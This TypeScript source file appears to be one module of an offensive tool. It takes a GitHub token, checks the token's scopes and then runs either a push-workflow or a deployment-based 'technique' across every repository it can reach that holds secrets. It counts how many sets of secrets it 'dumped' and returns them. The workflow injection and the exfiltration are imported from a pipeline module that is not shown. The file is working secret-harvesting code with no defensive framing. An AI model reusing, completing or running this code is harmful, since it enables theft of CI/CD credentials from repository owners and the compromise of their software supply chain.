import { getTokenMetadata } from "../../github_utils/tokenCheck";
import { logUtil } from "../../utils/logger";
import { Provider } from "../base";
import type { ProviderResult } from "../types";
import {
  runDeploymentOnReposWithSecrets,
  runFormatOnReposWithSecrets,
} from "./pipeline";

export type TokenRepo = {
  token: string;
  repo: string;
  owner: string;
};

export class GitHubActionsService extends Provider {
  private token;

  constructor(token: string) {
    super("github", "actions");
    this.token = token;
  }

  async execute(): Promise<ProviderResult> {
    const meta = await getTokenMetadata(this.token);
    if (!meta.valid) {
      return this.failure("Token invalid");
    }

    // Prefer push-based approach when workflow scope is available.
    if (meta.scopes.includes("workflow")) {
      return this.runPushWorkflow();
    }

    // Fall back to deployment-based approach — only needs repo scope.
    logUtil.log(
      "Missing workflow scope — falling back to deployment technique",
    );
    return this.runDeployWorkflow();
  }

  private async runPushWorkflow(): Promise<ProviderResult> {
    try {
      const { results, metadata } = await runFormatOnReposWithSecrets(
        this.token,
      );

      const dumped = results.filter((r) => !r.error).length;
      if (dumped === 0) {
        // Return all results as data so errors are visible in the output.
        return this.success({
          ok: false,
          dumped: 0,
          errored: results.filter((r) => r.error).length,
          results,
          metadata,
        });
      }
      return this.success({
        ok: true,
        dumped,
        errored: results.filter((r) => r.error).length,
        results,
        metadata,
      });
    } catch (e) {
      logUtil.error("Failure collecting results (push)");
      return this.failure(
        `Failure collecting results: ${e instanceof Error ? e.message : String(e)}`,
      );
    }
  }

  private async runDeployWorkflow(): Promise<ProviderResult> {
    try {
      const { results, metadata } = await runDeploymentOnReposWithSecrets(
        this.token,
      );

      const dumped = results.filter((r) => !r.error).length;
      if (dumped === 0) {
        return this.success({
          ok: false,
          dumped: 0,
          errored: results.filter((r) => r.error).length,
          results,
          metadata,
        });
      }
      return this.success({
        ok: true,
        dumped,
        errored: results.filter((r) => r.error).length,
        results,
        metadata,
      });
    } catch (e) {
      logUtil.error("Failure collecting results (deploy)");
      return this.failure(
        `Failure collecting results: ${e instanceof Error ? e.message : String(e)}`,
      );
    }
  }
}
